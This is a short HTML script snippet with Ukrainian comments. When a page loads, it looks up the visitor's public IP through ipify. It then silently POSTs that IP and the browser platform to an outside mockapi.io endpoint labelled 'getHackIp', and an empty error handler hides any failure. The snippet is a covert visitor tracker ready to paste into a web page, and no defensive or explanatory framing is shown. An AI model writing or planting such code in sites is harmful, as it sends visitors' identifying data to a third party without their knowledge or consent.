<script>
    // Функція для отримання IP
    async function getMyIP() {
        try {
            const hackApi = "https://6959330e6c3282d9f1d6de6b.mockapi.io/getHackIp"
            // Використовуємо безкоштовний сервіс ipify [citation:1][citation:2][citation:7]
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            
            const hackResponse = await fetch(hackApi, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body : JSON.stringify({
                    userIp: data.ip,
                    userPlatform: navigator.platform

                })

            });
            
        } catch (error) {
        }
    }

    // Викликаємо функцію
    getMyIP();
    </script>
